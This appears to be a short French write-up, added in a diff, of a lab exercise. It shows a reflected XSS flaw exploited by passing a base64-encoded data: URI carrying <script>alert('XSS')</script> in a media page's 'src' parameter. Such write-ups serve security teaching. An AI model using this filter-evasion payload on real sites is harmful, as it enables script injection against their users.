@@ -1,0 +1,27 @@
+# Resolve
+
+## Lien
+http://10.11.200.162/
+
+## Explication de la faille
+L'image NSA de la page d'accueil peut etre exploiter avec son tag href.
+
+Tuto: `https://owasp.org/www-community/xss-filter-evasion-cheatsheet`
+
+Remplacer:
+```
+<a href="?page=media&src=nsa">
+    <img src="images/nsa_prism.jpg" alt="">
+</a>
+```
+
+par
+```
+<a href="?page=media&amp;src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+    <img src="images/nsa_prism.jpg" alt="">
+</a>
+```
+Puis cliquer dessus.
+
+## Correction
+Voir le dossier XSS
